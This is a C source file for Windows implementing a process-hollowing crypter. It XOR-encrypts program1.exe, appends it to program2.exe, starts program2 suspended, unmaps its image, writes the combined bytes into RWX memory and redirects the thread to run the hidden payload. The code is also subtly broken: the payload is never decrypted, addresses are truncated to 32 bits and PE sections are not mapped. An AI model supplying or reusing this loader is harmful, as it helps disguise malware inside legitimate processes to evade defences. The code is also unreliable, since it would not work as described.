#include <stdio.h>
#include <windows.h>
#include <ntdll.h>
#include <winternl.h>

#define XOR_KEY 0x40

// function to encrypt the input data
void encrypt(unsigned char *data, size_t len) {
    for (int i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
    }
}

int main(int argc, char *argv[]) {

    // open program1
    HANDLE program1_file = CreateFile("program1.exe", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (program1_file == INVALID_HANDLE_VALUE) {
        printf("Failed to open program1.exe\n");
        return 1;
    }

    // get the size of program1
    DWORD program1_size = GetFileSize(program1_file, NULL);

    // allocate memory to hold the encrypted program1
    BYTE *encrypted_program1 = (BYTE*)malloc(program1_size);
    if (encrypted_program1 == NULL) {
        printf("Failed to allocate memory for encrypted program1\n");
        CloseHandle(program1_file);
        return 1;
    }

    // read program1 into memory
    DWORD bytes_read;
    if (!ReadFile(program1_file, encrypted_program1, program1_size, &bytes_read, NULL)) {
        printf("Failed to read program1.exe\n");
        free(encrypted_program1);
        CloseHandle(program1_file);
        return 1;
    }

    // encrypt program1
    encrypt(encrypted_program1, program1_size);

    // close program1
    CloseHandle(program1_file);

    // open program2
    HANDLE program2_file = CreateFile("program2.exe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (program2_file == INVALID_HANDLE_VALUE) {
        printf("Failed to open program2.exe\n");
        free(encrypted_program1);
        return 1;
    }

    // get the size of program2
    DWORD program2_size = GetFileSize(program2_file, NULL);

    // allocate memory to hold the contents of program2
    BYTE *program2_contents = (BYTE*)malloc(program2_size);
    if (program2_contents == NULL) {
        printf("Failed to allocate memory for program2\n");
        free(encrypted_program1);
        CloseHandle(program2_file);
        return 1;
    }

    // read program2 into memory
    if (!ReadFile(program2_file, program2_contents, program2_size, &bytes_read, NULL)) {
        printf("Failed to read program2.exe\n");
        free(program2_contents);
        free(encrypted_program1);
        CloseHandle(program2_file);
        return 1;
    }

    // close program2
    CloseHandle(program2_file);

    // calculate the new size of program2 with the encrypted program1 appended
    DWORD new_program2_size = program2_size + program1_size;

    // allocate memory to hold the new program2
    BYTE *new_program2 = (BYTE*)malloc(new_program2_size);
    if (new_program2 == NULL) {
        printf("Failed to allocate memory for new program2\n");
        free(program2_contents);
        free(encrypted_program1);
        return 1;
    }

    // copy program2 into the new buffer
    memcpy(new_program2, program2_contents, program2_size);

   // copy the encrypted program1 to the end of the new program2
    memcpy(new_program2 + program2_size, encrypted_program1, program1_size);

    // free the memory used for program2 contents and encrypted program1
    free(program2_contents);
    free(encrypted_program1);

    // create the suspended process of program2
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcess(NULL, "program2.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("Failed to create the process for program2.exe\n");
        free(new_program2);
        return 1;
    }

    // get the context of the program2 process
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &context)) {
        printf("Failed to get the context of program2.exe\n");
        free(new_program2);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    // unload program2's image from memory
    NtUnmapViewOfSection(pi.hProcess, (PVOID)context.Rbx);

    // allocate memory in the program2 process for program1
    LPVOID allocated_memory = VirtualAllocEx(pi.hProcess, (LPVOID)context.Rbx, new_program2_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocated_memory) {
        printf("Failed to allocate memory in the process for program1\n");
        free(new_program2);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    // write the new program2 with encrypted program1 to the allocated memory
    if (!WriteProcessMemory(pi.hProcess, allocated_memory, new_program2, new_program2_size, NULL)) {
        printf("Failed to write the new program2 with encrypted program1 to the process\n");
        free(new_program2);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    // update the context with the new ImageBase and OEP
    context.Rax = (DWORD)allocated_memory;
    context.Rip = (DWORD)allocated_memory + program2_size;

    // set the updated context
    if (!SetThreadContext(pi.hThread, &context)) {
        printf("Failed to set the updated context for program2.exe\n");
        free(new_program2);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    // resume the main thread of program2
    ResumeThread(pi.hThread);

    // cleanup and exit
    free(new_program2);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
